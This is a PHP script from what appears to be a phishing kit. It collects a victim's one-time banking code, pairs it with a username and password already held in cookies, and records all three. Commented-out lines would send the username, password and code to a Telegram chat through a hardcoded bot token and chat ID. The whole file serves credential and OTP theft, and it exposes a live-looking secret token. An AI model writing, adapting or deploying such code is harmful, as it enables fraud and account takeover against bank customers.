<?php 
require('../panel/lib/funciones.php');
require('../acciones/bot_telegram.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_POST['otp'];

setcookie('cdinamica',$cdinamica,time()+60*9);
actualizar_registro_otp($registro,$cdinamica);


if(empty($usuario) || empty($contrasena)){
    
}else{
    
// $chatId= "1053381147";
// $token = "7326614103:AAH7nj1c_exaJ8VUAVSLNYM4dUcaX3nu2JI";
// $mensaje = "Nueva Dinamica: $usuario - $contrasena\n Dinamica: $cdinamica";
// enviarMensajeTelegram($chatId, $mensaje, $token);
}
?>